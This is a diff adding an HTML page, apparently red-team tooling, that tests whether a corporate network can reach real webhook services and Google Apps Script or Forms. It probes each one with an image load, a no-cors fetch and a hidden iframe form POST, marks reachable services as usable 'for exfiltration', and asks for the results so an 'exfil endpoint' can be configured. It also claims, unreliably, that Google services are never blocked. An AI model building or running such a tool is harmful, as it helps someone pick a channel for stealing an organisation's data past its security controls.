@@ -1,0 +1,146 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>Webhook Connectivity Test</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{background:#0c0c14;color:#c8c8d8;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;padding:40px;max-width:700px;margin:0 auto}
+h1{font-size:22px;margin-bottom:8px}
+.sub{color:#666;font-size:13px;margin-bottom:24px}
+.test-card{background:#10101a;border:1px solid #252535;border-radius:8px;padding:16px;margin-bottom:12px}
+.test-card h3{font-size:14px;margin-bottom:4px}
+.test-card .desc{color:#666;font-size:12px;margin-bottom:10px}
+.test-card .url{color:#fa0;font-family:monospace;font-size:11px;word-break:break-all;margin-bottom:8px}
+.btn{background:#4a6cf7;color:#fff;border:none;padding:8px 20px;border-radius:5px;font-size:13px;cursor:pointer;font-family:inherit}
+.btn:hover{background:#5b7df8}
+.result{margin-top:10px;padding:8px;border-radius:4px;font-family:monospace;font-size:12px;display:none}
+.ok{background:#0a1a0a;border:1px solid #0f83;color:#0f8;display:block}
+.fail{background:#1a0a0a;border:1px solid #f343;color:#f34;display:block}
+.testing{background:#1a1a10;border:1px solid #fa03;color:#fa0;display:block;animation:pulse 1s infinite}
+@keyframes pulse{0%,100%{opacity:1}50%{opacity:.4}}
+.instructions{background:#10101a;border:1px solid #252535;border-radius:8px;padding:16px;margin-top:24px}
+.instructions h3{color:#4a6cf7;font-size:14px;margin-bottom:8px}
+.instructions ol{color:#999;font-size:13px;padding-left:20px;line-height:1.8}
+.instructions code{background:#06060c;padding:2px 6px;border-radius:3px;font-size:12px;color:#fa0}
+</style>
+</head>
+<body>
+<h1>Exfiltration Endpoint Connectivity Test</h1>
+<div class="sub">Tests whether your corporate firewall blocks common webhook services. Click each button to test.</div>
+
+<div class="test-card" id="card-reqcatch">
+  <h3>1. requestcatcher.com</h3>
+  <div class="desc">Free, no login required. Pick any name to create an endpoint instantly.</div>
+  <div class="url">https://s1-redteam.requestcatcher.com/test</div>
+  <button class="btn" onclick="testEndpoint('reqcatch', 'https://s1-redteam.requestcatcher.com/test')">Test Connection</button>
+  <div class="result" id="res-reqcatch"></div>
+</div>
+
+<div class="test-card" id="card-webhook">
+  <h3>2. webhook.site</h3>
+  <div class="desc">Popular webhook tester. Often blocked by corporate security tools.</div>
+  <div class="url">https://webhook.site/token/random-test/requests</div>
+  <button class="btn" onclick="testEndpoint('webhook', 'https://webhook.site')">Test Connection</button>
+  <div class="result" id="res-webhook"></div>
+</div>
+
+<div class="test-card" id="card-google">
+  <h3>3. script.google.com (Google Apps Script)</h3>
+  <div class="desc">Google infrastructure. NEVER blocked by corporate firewalls (needed for Google Workspace).</div>
+  <div class="url">https://script.google.com</div>
+  <button class="btn" onclick="testEndpoint('google', 'https://script.google.com')">Test Connection</button>
+  <div class="result" id="res-google"></div>
+</div>
+
+<div class="test-card" id="card-gforms">
+  <h3>4. docs.google.com (Google Forms)</h3>
+  <div class="desc">Google Docs/Forms. Also never blocked.</div>
+  <div class="url">https://docs.google.com/forms/</div>
+  <button class="btn" onclick="testEndpoint('gforms', 'https://docs.google.com/forms/')">Test Connection</button>
+  <div class="result" id="res-gforms"></div>
+</div>
+
+<div class="instructions">
+  <h3>Next Steps</h3>
+  <ol>
+    <li>Run each test above</li>
+    <li>Note which services are <span style="color:#0f8">REACHABLE</span> vs <span style="color:#f34">BLOCKED</span></li>
+    <li>Report back which ones worked so we configure the right exfil endpoint</li>
+    <li>If only Google services work, we'll use Google Apps Script (2-minute setup)</li>
+  </ol>
+</div>
+
+<script>
+async function testEndpoint(name, url) {
+  const el = document.getElementById('res-' + name);
+  el.className = 'result testing';
+  el.textContent = 'Testing connection to ' + url + '...';
+
+  const t0 = Date.now();
+
+  // We test multiple methods since corporate proxies behave differently
+
+  // Test 1: Image load (GET) — works through most firewalls
+  const imgOk = await new Promise(resolve => {
+    const img = new Image();
+    img.onload = () => resolve(true);
+    img.onerror = () => resolve('error'); // error doesn't necessarily mean blocked
+    setTimeout(() => resolve('timeout'), 8000);
+    img.src = url + '?_t=' + Date.now();
+  });
+
+  // Test 2: fetch with no-cors (opaque response but tells us if network works)
+  let fetchOk = false;
+  try {
+    const resp = await Promise.race([
+      fetch(url + '?_t=' + Date.now(), { mode: 'no-cors', cache: 'no-store' }),
+      new Promise((_, rej) => setTimeout(() => rej('timeout'), 8000))
+    ]);
+    fetchOk = true; // opaque response = connection succeeded
+  } catch(e) {
+    fetchOk = false;
+  }
+
+  // Test 3: hidden iframe form POST
+  let formOk = false;
+  try {
+    const iframe = document.createElement('iframe');
+    iframe.name = 'test_' + name + '_' + Date.now();
+    iframe.style.cssText = 'position:fixed;width:0;height:0;border:0;opacity:0';
+    document.body.appendChild(iframe);
+    const form = document.createElement('form');
+    form.method = 'POST';
+    form.action = url;
+    form.target = iframe.name;
+    form.style.display = 'none';
+    const input = document.createElement('input');
+    input.name = 'test';
+    input.value = 'connectivity_check_' + Date.now();
+    form.appendChild(input);
+    document.body.appendChild(form);
+    form.submit();
+    formOk = true; // form submission doesn't throw = not blocked at network level
+    setTimeout(() => { try { form.remove(); iframe.remove(); } catch(e){} }, 5000);
+  } catch(e) {
+    formOk = false;
+  }
+
+  const elapsed = Date.now() - t0;
+
+  // Verdict
+  if (fetchOk || formOk) {
+    el.className = 'result ok';
+    el.innerHTML = 'REACHABLE (' + elapsed + 'ms) — fetch: ' + (fetchOk ? 'OK' : 'blocked')
+      + ', form POST: ' + (formOk ? 'OK' : 'blocked')
+      + ', image: ' + imgOk
+      + '<br><span style="color:#0f8;font-weight:bold">This endpoint can be used for exfiltration.</span>';
+  } else {
+    el.className = 'result fail';
+    el.innerHTML = 'BLOCKED or UNREACHABLE (' + elapsed + 'ms) — fetch: blocked, form: blocked, image: ' + imgOk
+      + '<br><span style="color:#f34;font-weight:bold">This service is blocked by your network. Try another.</span>';
+  }
+}
+</script>
+</body>
+</html>
